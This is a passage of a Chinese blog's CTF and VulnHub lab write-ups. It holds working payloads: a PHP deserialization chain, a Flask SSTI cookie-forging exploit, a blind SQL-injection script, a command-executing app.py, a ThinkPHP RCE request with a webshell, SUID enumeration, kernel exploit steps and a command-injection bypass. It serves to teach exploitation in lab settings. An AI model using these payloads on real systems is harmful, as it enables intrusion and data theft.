<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>得到结果<br><code>a:2:&#123;i:0;O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:2:&quot;ls&quot;;&#125;&#125;&#125;&#125;&#125;i:1;r:2;&#125;</code><br>这里将<code>i:0</code>改为<code>i:1</code>即可绕过throw成功触发<code>__destruct()</code><br><code>a:2:&#123;i:1;O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:2:&quot;ls&quot;;&#125;&#125;&#125;&#125;&#125;i:1;r:2;&#125;</code></p>
<p><img src="https://img-blog.csdnimg.cn/949cac6db39a4b47a7c3f37641e35358.png" alt="456"></p>
<h3 id="InjectMe"><a href="#InjectMe" class="headerlink" title="InjectMe"></a>InjectMe</h3><p>知识点：SSTI<br><img src="https://img-blog.csdnimg.cn/433667ad644a4d51bb2825e80fa85c05.png" alt="123"><br>url为：<code>http://007b1ed3-c9a0-400b-bc74-007f54a2966c.node4.buuoj.cn:81/download?file=1.jpg</code><br>可以试试任意文件下载，发现成功了。<br>由于docker里用的是flask，可以尝试看看源码位置，最后发现在&#x2F;app&#x2F;app.py</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token keyword">import</span> re

<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> abort<span class="token punctuation">,</span> send_file<span class="token punctuation">,</span> session<span class="token punctuation">,</span> render_template_string
<span class="token keyword">from</span> config <span class="token keyword">import</span> secret_key

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> secret_key


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># put application's code here</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/cancanneed"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">cancanneed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    all_filename <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'./static/img/'</span><span class="token punctuation">)</span>
    filename <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> filename<span class="token punctuation">:</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'img.html'</span><span class="token punctuation">,</span> filename<span class="token operator">=</span>filename<span class="token punctuation">,</span> all_filename<span class="token operator">=</span>all_filename<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'./static/img/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> &lt;br> &lt;a href=\"/cancanneed?file=1.jpg\">/cancanneed?file=1.jpg&lt;/a>"</span></span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/download"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    filename <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> filename<span class="token punctuation">:</span>
        filename <span class="token operator">=</span> filename<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'../'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
        filename <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'static/img/'</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token punctuation">(</span><span class="token string">"start"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> send_file<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            abort<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        abort<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/backdoor'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"guest"</span>
        name <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>
                <span class="token string">r'__|&#123;&#123;|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.'</span><span class="token punctuation">,</span>
                name<span class="token punctuation">)</span><span class="token punctuation">:</span>
            abort<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>
                <span class="token string">'竟然给&lt;h1>%s&lt;/h1>你找到了我的后门，你一定是网络安全大赛冠军吧！😝 &lt;br> 那么 现在轮到你了!&lt;br> 最后祝您玩得愉快!😁'</span> <span class="token operator">%</span> name<span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
        abort<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">page_not_find</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'404.html'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">404</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">internal_server_error</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'500.html'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">500</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>其中看到这一点：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> config <span class="token keyword">import</span> secret_key

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> secret_key<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>说明还存在一个key，这个时候想到了可能是session伪造，但是后面才知道自己错了。<br>开始寻找key：尝试读取config.py文件，还真发现key了。<br>访问&#x2F;backdoor<br><img src="https://img-blog.csdnimg.cn/9e10aa25386245fcab49d3ac50e42782.png" alt="789"><br>结合源码这里guest是注入点。<br>最后的exp：</p>
<blockquote>
<p><code>python flask_session_cookie_manager3.py encode -s &quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot; -t &quot;&#123;&#39;user&#39;:\&quot;&#123;% print(()['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[280]('paste /y0U3_f14g_1s_h3re',shell=True,stdout=-1)['communic''ate']()[0]['strip']())%&#125;\&quot;&#125;&quot;</code></p>
</blockquote>
<h3 id="midsql"><a href="#midsql" class="headerlink" title="midsql"></a>midsql</h3><p><img src="https://img-blog.csdnimg.cn/b2e48cac738542c2b9d600cbb190c40b.png" alt="456"><br>exp:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#Author: f0njl//这个是大佬！！！</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> datetime

url <span class="token operator">=</span> <span class="token string">"http://5e08a16e-94a2-4d92-8e7a-85d3c1cf93b0.node4.buuoj.cn:81/?id="</span>
flag <span class="token operator">=</span> <span class="token string">""</span>
<span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"0123456789asdfghjklzxcvbnmqwertyuiop&#125;&#123;-_."</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
        <span class="token comment">#payload = "1/**/and/**/if(substr(database(),&#123;&#125;,1)/**/like/**/'&#123;&#125;',sleep(2),1)--".format(i,j)</span>
        <span class="token comment">#payload = "1/**/and/**/if(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/database()),&#123;&#125;,1)/**/like/**/'&#123;&#125;',sleep(3),1)--".format(i,j)</span>
        payload <span class="token operator">=</span> <span class="token string">"1/**/and/**/if(substr((select/**/group_concat(id,name,price)/**/from/**/items),&#123;&#125;,1)/**/like/**/'&#123;&#125;',sleep(5),1)--"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>
        time1 <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
        time2 <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>
        sec <span class="token operator">=</span> <span class="token punctuation">(</span>time2 <span class="token operator">-</span> time1<span class="token punctuation">)</span><span class="token punctuation">.</span>seconds
        <span class="token keyword">if</span> sec <span class="token operator">></span> <span class="token number">4</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> j
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="flask-disk"><a href="#flask-disk" class="headerlink" title="flask disk"></a>flask disk</h3><p>这个看了wp，我是真的没有想到:cry:</p>
<p>整体思路就是再上传一个app.py文件将原来的覆盖掉，而且自己上传的app.py文件可以进行命令执行</p>
<p>上传的app.py文件</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#编写一个能够执行系统命令的app.py文件</span>

<span class="token keyword">import</span> os
<span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token punctuation">,</span>Flask
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        cmd <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span>
        data<span class="token operator">=</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> data
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
    <span class="token keyword">return</span> <span class="token string">"1"</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在访问主页面发现页面显示1<br><img src="https://img-blog.csdnimg.cn/ba72b904153041518054f8b91dc9fa42.png" alt="1"></p>
<p>然后命令执行找到flag文件即可<br><img src="https://img-blog.csdnimg.cn/08117b98aae246469e673400a37b8fd7.png" alt="4"></p>
<h2 id="week5-web"><a href="#week5-web" class="headerlink" title="week5-web"></a>week5-web</h2><h3 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h3><p>thinkphp版本V5.0，查找相关漏洞<br>可以使用thinkphp漏洞检测工具检测<br><img src="https://img-blog.csdnimg.cn/9c5d9c30762645d5bd5e2908a85aa5a9.png" alt="123"><br>当然也可以自己找payload。<br><code>Payload: http://a3b86432-64d4-4f0b-baf9-2ff5ed65a5aa.node4.buuoj.cn:81/?s=captcha&amp;test=-1  Post: _method=__construct&amp;filter[]=phpinfo&amp;method=get&amp;server[REQUEST_METHOD]=1</code><br>发现禁用了函数<br><img src="https://img-blog.csdnimg.cn/a61aa626bbbc41139d0549f5f6a31875.png" alt="78"><br>使用<code>exec、passthru</code>代替，然后写入一句话木马。<br><img src="https://img-blog.csdnimg.cn/f990d9432a94456393f414f51e9683f0.png" alt="456"><br>成功写入<br><img src="https://img-blog.csdnimg.cn/7db60203c64241acac20e5d7a58b229d.png" alt="123"><br>但是还要进行提权<br><img src="https://img-blog.csdnimg.cn/937b271605e24fff8b6180ca5049e0a1.png" alt="789"><br>查看具有SUID权限的命令：</p>
<blockquote>
<p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null<br>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null<br>find &#x2F; -user root -perm -4000 -exec ls -ldb {} ;</p>
</blockquote>
<p>后面借助<a href="https://gtfobins.github.io/">GTFOBins</a>进行提权吧！！！</p>
]]></content>
      <categories>
        <category>赛事WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Lord-Of-The-Root-1-0-1</title>
    <url>/2023/09/11/Lord-Of-The-Root-1-0-1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>1、靶机下载地址：<a href="https://download.vulnhub.com/lordoftheroot/LordOfTheRoot_1.0.1.ova">https://download.vulnhub.com/lordoftheroot/LordOfTheRoot_1.0.1.ova</a> 2、涉及知识点： &gt;1、端口碰撞 &gt;2、内核提权（Ubuntu14.04版本） &gt;3、UDF提权</p>
<h2 id="靶机知识点记录"><a href="#靶机知识点记录" class="headerlink" title="靶机知识点记录"></a>靶机知识点记录</h2><p>使用nmap探测之后发现靶机只开放了22（ssh）端口？？什么玩意儿。。。 在尝试ssh登录时发现一部分内容： <img src="https://img-blog.csdnimg.cn/090fe71b8b45414dbf63b1f3f996bf28.png" alt="45"> 看到了easy as 1，2，3。 以前也没遇到过，再查看别人的打靶记录之后发现原来是关于<strong>端口碰撞（Port Knocking）技术</strong>的知识点。</p>
<blockquote>
<p>端口碰撞是一种通过在一组预先指定的关闭端口上产生连接请求，从外部打开防火墙上的端口的方法。如果收到正确的连接请求序列，防火墙规则就会被动态更改，从而允许连接请求的主机通过特定端口进行连接。如果不是按照特定的端口序列进行请求，那么受保护的端口就会关闭。</p>
</blockquote>
<p>靶机这个意思应该就是要按照端口1、2、3的序列进行连接尝试。之后打开受保护的端口。 <strong>端口碰撞方法</strong></p>
<ul>
<li>1 knock命令</li>
</ul>
<blockquote>
<p>konck 192.168.206.144 1 2 3 -v</p>
</blockquote>
<ul>
<li>2 nmap命令</li>
</ul>
<blockquote>
<p>按次序进行指定端口扫描即可</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/7130abec22004654add004cd8a88ed15.png" alt="2"></p>
<p>之后再使用nmap探测。 后面在找到登录页面之后尝试进行sql注入。 普通的方式进行SQLmap注入扫描没找到，使用sqllmap进行针对表单的注入:</p>
<blockquote>
<p>sqlmap -o -u <a href="http://192.168.206.144:1337/978345210/index.php">http://192.168.206.144:1337/978345210/index.php</a> –forms –dbs</p>
</blockquote>
<p>在拿到账号密码之后使用ssh登录靶机</p>
<blockquote>
<p>ssh <a href="mailto:&#115;&#109;&#x65;&#x61;&#103;&#x6f;&#108;&#64;&#49;&#57;&#x32;&#46;&#x31;&#x36;&#x38;&#46;&#50;&#x30;&#54;&#46;&#49;&#52;&#52;">&#115;&#109;&#x65;&#x61;&#103;&#x6f;&#108;&#64;&#49;&#57;&#x32;&#46;&#x31;&#x36;&#x38;&#46;&#50;&#x30;&#54;&#46;&#49;&#52;&#52;</a> MyPreciousR00t</p>
</blockquote>
<p>登录之后当然要开始收集信息进行提权了，查看系统版本</p>
<blockquote>
<p>uname -a Linux LordOfTheRoot 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU&#x2F;Linux</p>
</blockquote>
<p>也可以给靶机上传一个信息收集文件 本机使用python开启一个http服务</p>
<blockquote>
<p>python -m http.server</p>
</blockquote>
<p>靶机下载文件</p>
<blockquote>
<p>wget <a href="http://192.168.206.1:8000/linux-exploit-suggester.sh">http://192.168.206.1:8000/linux-exploit-suggester.sh</a> chmod 777 linux-exploit-suggester.sh .&#x2F;linux-exploit-suggester.sh</p>
</blockquote>
<p>收集一波之后发现可以使用脏牛提权，但是试了几次都把靶机搞坏了，换一种方法吧。 我使用的多的信息收集工具是<strong>linpeas.sh</strong>。 好了先使用内核提权搜索Ubuntu14.04版本提权漏洞 找到一个<a href="https://www.exploit-db.com/exploits/39166">CVE-2015-8660</a></p>
<p>下载之后执行以下命令就行</p>
<blockquote>
<p>gcc 39166.c -o dayu chmod 777 czy .&#x2F;dayu</p>
<p>提权成功 <img src="https://img-blog.csdnimg.cn/58e4f735e80748d499a4ac198f5ae0fb.png" alt="1"> 之前使用linpeas.sh收集信息时发现还有个地方有问题 <img src="https://img-blog.csdnimg.cn/d8c77bb96f4c484586bcd00c0c8e223e.png" alt="1"> 在root目录下发现还有一个python文件switcher.py文件，内容与3个door文件有关，这里涉及缓冲区溢出的问题，有时间再看。 然后还有一种提权方法就是<strong>UDF提权</strong> 直接用的exp：</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/a1a2a7ff0ac242e8a35747b3d27ce149.png" alt="12"></p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
  </entry>
  <entry>
    <title>羊城杯2022</title>
    <url>/2023/09/05/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h3 id="Blackcat"><a href="#Blackcat" class="headerlink" title="Blackcat"></a>Blackcat</h3><blockquote>
<p>tips：strings 查看音频文件</p>
</blockquote>
<p>web界面除了一个音频，没有什么可看的地方，右键查看代码也无。<br>最后下载音频进行查看，使用<code>strings 音频文件</code>在末尾看到源码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">Title
<span class="token constant">APETAGEX</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Black-Cat-Sheriff'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'One-ear'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'
$clandestine = getenv("clandestine");
if(isset($_POST['</span>White<span class="token operator">-</span>cat<span class="token operator">-</span>monitor<span class="token string single-quoted-string">']))
    $clandestine = hash_hmac('</span>sha256<span class="token string single-quoted-string">', $_POST['</span>White<span class="token operator">-</span>cat<span class="token operator">-</span>monitor<span class="token string single-quoted-string">'], $clandestine);
$hh = hash_hmac('</span>sha256<span class="token string single-quoted-string">', $_POST['</span>One<span class="token operator">-</span>ear<span class="token string single-quoted-string">'], $clandestine);
if($hh !== $_POST['</span>Black<span class="token operator">-</span>Cat<span class="token operator">-</span>Sheriff<span class="token string single-quoted-string">'])&#123;
    die('</span>
<span class="token keyword">echo</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nc"</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'One-ear'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>首先使用POST方式提交参数Black-Cat-Sheriff和One-ear，clandestine存储环境变量的值。然后clandestine又存储经过hash_hmac函数哈希运算的值，hh存储经过hash_hmac函数哈希运算的值，POST传入Black-Cat-Sheriff的值和hh不相等的话继续执行下面命令。</p>
<p><strong>hash_hmac函数</strong><br>说明<br>hash_hmac ( string $algo , string $data , string $key [, bool $raw_output &#x3D; FALSE ] ) : string<br>参数</p>
<ul>
<li><p>algo<br>要使用的哈希算法名称，例如：”md5”，”sha256”，”haval160,4” 等。 如何获取受支持的算法清单，请参见 hash_hmac_algos() 函数。</p>
</li>
<li><p>data<br>要进行哈希运算的消息。</p>
</li>
<li><p>key<br>使用 HMAC 生成信息摘要时所使用的密钥。</p>
</li>
<li><p>raw_output<br>设置为 TRUE 输出原始二进制数据， 设置为 FALSE 输出小写 16 进制字符串。</p>
</li>
</ul>
<p>返回值<br>如果 raw_output 设置为 TRUE， 则返回原始二进制数据表示的信息摘要， 否则返回 16 进制小写字符串格式表示的信息摘要。 如果 algo 参数指定的不是受支持的算法，返回 FALSE。<br><img src="https://img-blog.csdnimg.cn/6ee08b16227742af90dc5803049d27ba.png" alt="1"></p>
<p><img src="https://img-blog.csdnimg.cn/ca6ca0b3329c47ff8173d82eb56e2150.png" alt="2"></p>
<p>然后还有一个小知识点就是</p>
<blockquote>
<p>hash_hmac($algo, $data, $key)<br>当data为数组时，返回值为null（空）。</p>
</blockquote>
<p>再看代码：</p>
<blockquote>
<p>echo exec(“nc”.$_POST[‘One-ear’]);</p>
<p>传入<code>One-ear</code>为<code>;cat flag.php</code>，为了拿到flag文件。<br>$clandestine &#x3D; hash_hmac(‘sha256’, $_POST[‘White-cat-monitor’], $clandestine);</p>
</blockquote>
<p>传入<code>White-cat-monitor</code>为数组形式让clandestine返回为空（null）</p>
<blockquote>
<p>if($hh !&#x3D;&#x3D; $_POST[‘Black-Cat-Sheriff’])</p>
</blockquote>
<p>如果要满足条件的话将下面代码运行的结果赋值给Black-Cat-Sheriff</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sha256'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">";cat flag.php"</span><span class="token punctuation">,</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>原理就是<code>$hh = hash_hmac(&#39;sha256&#39;, $_POST[&#39;One-ear&#39;], $clandestine);</code>中的<code>$clandestine</code>此时受上面<code>$clandestine = hash_hmac(&#39;sha256&#39;, $_POST[&#39;White-cat-monitor&#39;], $clandestine);</code>的影响，此时<code>$clandestine</code>为null。即满足了条件。<br><img src="https://img-blog.csdnimg.cn/c011321dc2ce4571ade8bb4d58d9774c.png" alt="3"></p>
<h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><blockquote>
<p>tips：.htaccess文件</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
